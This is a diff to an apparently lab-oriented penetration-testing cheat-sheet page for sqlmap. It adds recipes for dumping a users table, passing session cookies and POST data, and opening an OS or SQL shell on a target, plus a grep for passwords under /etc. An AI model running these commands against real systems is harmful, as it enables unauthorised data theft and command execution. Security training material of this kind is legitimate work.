@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=sqlmap) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -23,8 +25,48 @@ sqlmap -r request.txt -D DATABASE --tables
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=sqlmap)
+## Notebook recipes
 
-## Learning and original examples
+2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [sqlmap: Saved Requests and Enumeration](/web/sqlmap)
+<AccordionGroup>
+
+<Accordion title="Finding things">
+
+### Finding things
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
+find . -type f -mmin -10               # files modified in last 10 min
+locate sqlmap                          # fast name search (run: sudo updatedb first)
+which nmap                             # path of a command
+whereis nmap
+grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
+```
+
+</Accordion>
+
+<Accordion title="sqlmap: Saved Requests and Enumeration">
+
+### sqlmap: Saved Requests and Enumeration
+
+**sqlmap: Saved Requests and Enumeration**
+
+```bash
+sqlmap -r request.txt --batch                 # from a saved raw request
+sqlmap -u "http://$IP/item?id=1" --batch --dbs
+sqlmap -u "http://$IP/item?id=1" -D shop --tables
+sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
+# Auth / cookies / POST
+sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
+sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
+# Shells
+sqlmap -r request.txt --os-shell            # OS command shell if possible
+sqlmap -r request.txt --sql-shell
+```
+
+</Accordion>
+
+</AccordionGroup>
